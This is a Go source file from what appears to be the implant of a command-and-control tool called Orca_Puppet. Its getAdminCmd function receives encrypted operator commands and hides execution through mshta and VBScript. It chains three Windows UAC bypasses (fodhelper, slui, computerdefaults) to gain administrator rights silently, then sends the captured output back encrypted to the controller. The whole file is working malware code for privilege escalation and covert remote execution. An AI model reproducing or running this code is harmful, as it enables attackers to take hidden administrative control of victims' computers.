package controller

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/pkg/bypassuac"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"time"
)

func getAdminCmd(sendUserId, decData string) {
	type AdminMsg struct {
		Cmd   string
		Echo  bool
		Delay int
	}
	var adminMsg AdminMsg
	json.Unmarshal([]byte(decData), &adminMsg)
	cmd := adminMsg.Cmd
	echo := adminMsg.Echo
	delay := adminMsg.Delay
	timeStr := strconv.FormatInt(time.Now().Unix(), 10)
	tempFile := fmt.Sprintf("C:\\Windows\\temp\\%s.txt", timeStr)
	if len(strings.TrimSpace(cmd)) == 0 {
		path, err := util.GetExecPath()
		if err != nil {
			message := fmt.Sprintf("%v", err)
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
			return
		}
		args := strings.Join(os.Args[1:], " ")
		//cmd = fmt.Sprintf("start /min cmd.exe /c %s %s &&exit", path, args)
		cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s %s\",0)(window.close) &&exit", path, args)
	} else {
		if echo {
			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s > %s\",0)(window.close) &&exit", cmd, tempFile)
		} else {
			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s\",0)(window.close) &&exit", cmd)
		}
	}

	err := bypassuac.ExecFodhelper(cmd)
	if err != nil {
		err = bypassuac.ExecSlui(cmd)
		if err != nil {
			err = bypassuac.ExecComputerdefaults(cmd)
			if err != nil {
				message := fmt.Sprintf("failed to obtain administrator privileges: %v", err)
				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
				outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
				return
			}
		}
	}

	time.Sleep(time.Duration(delay) * time.Second)
	outData := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "successfully executed with administrator privileges")
	defer os.Remove(tempFile)
	if echo {
		f, _ := os.Open(tempFile)
		if err != nil {
			message := fmt.Sprintf("failed to open output files: %v", err)
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
			return
		}
		defer f.Close()
		reader := bufio.NewReader(f)
		for {
			line, _, err := reader.ReadLine()
			if err != nil {
				if err == io.EOF {
					break
				} else {
					message := fmt.Sprintf("failed to read output files: %v", err)
					data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
					outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
					common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
					return
				}
			}
			outData += strings.Trim(util.ConvertByte2String(line, "GB18030"), " ") + "\n"
		}
	}

	outputMsg, _ := crypto.Encrypt([]byte(outData), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
}
